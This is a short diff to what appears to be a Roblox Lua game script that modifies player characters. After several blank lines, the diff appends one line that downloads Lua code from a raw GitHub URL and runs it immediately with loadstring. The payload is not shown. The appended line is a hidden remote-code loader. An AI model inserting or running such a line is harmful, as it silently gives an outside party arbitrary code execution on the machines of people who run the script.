@@ -311,3 +311,9 @@ for _, player in pairs(Players:GetPlayers()) do
         applyCabesa(char)
     end)
 end
+
+
+
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Waza80/scripts-new/refs/heads/main/AXRemove.lua"))()
